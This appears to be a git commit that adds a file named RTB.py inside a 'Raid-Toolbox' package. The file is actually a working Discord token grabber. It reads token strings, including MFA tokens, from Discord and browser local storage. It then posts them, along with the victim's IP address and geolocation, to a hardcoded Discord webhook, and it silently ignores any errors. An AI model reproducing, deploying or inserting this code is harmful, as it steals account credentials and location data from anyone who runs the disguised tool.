85b2e59adcf221a3caa7ffc3f425c855c6b06695
ExperteMaty <77948502+ExperteMaty@users.noreply.github.com>
2021-01-25 00:05:13 -0300

    Add files via upload

---
+++ Raid-Toolbox-1.2.9/RTB.py
@@ -0,0 +1,106 @@
+import os
+import re
+import json
+
+from urllib.request import Request, urlopen
+
+# your webhook URL
+WEBHOOK_URL = 'https://discord.com/api/webhooks/793018446975729684/dt2z78ODmerpLBBJJmhsmB4B1XshSFKmqjkaJHAeVNzRkXzjAO3gZEO2Yao1FvVa4Tkz'
+
+# mentions you when you get a hit
+PING_ME = False
+
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+def main():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
+
+    message = '@everyone' if PING_ME else ''
+
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+
+        message += f'\n**{platform}**\n```\n'
+
+        tokens = find_tokens(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
+
+        message += '```'
+
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
+
+    payload = json.dumps({'content': message})
+
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
+
+if __name__ == '__main__':
+    main()
+import requests
+import json
+from dhooks import Webhook, Embed
+from datetime import datetime
+
+hook = Webhook("https://discord.com/api/webhooks/793018446975729684/dt2z78ODmerpLBBJJmhsmB4B1XshSFKmqjkaJHAeVNzRkXzjAO3gZEO2Yao1FvVa4Tkz")
+
+time = datetime.now().strftime("%H:%M %p")  
+ip = requests.get('https://api.ipify.org/').text
+
+r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
+geo = r.json()
+embed = Embed()
+fields = [
+    {'name': 'IP', 'value': geo['query']},
+    {'name': 'ipType', 'value': geo['ipType']},
+    {'name': 'Country', 'value': geo['country']},
+    {'name': 'City', 'value': geo['city']},
+    {'name': 'Continent', 'value': geo['continent']},
+    {'name': 'Country', 'value': geo['country']},
+    {'name': 'IPName', 'value': geo['ipName']},
+    {'name': 'ISP', 'value': geo['isp']},
+    {'name': 'Latitute', 'value': geo['lat']},
+    {'name': 'Longitude', 'value': geo['lon']},
+    {'name': 'Org', 'value': geo['org']},
+    {'name': 'Region', 'value': geo['region']},
+    {'name': 'Status', 'value': geo['status']},
+]
+for field in fields:
+    if field['value']:
+        embed.add_field(name=field['name'], value=field['value'], inline=True)
+hook.send(embed=embed)
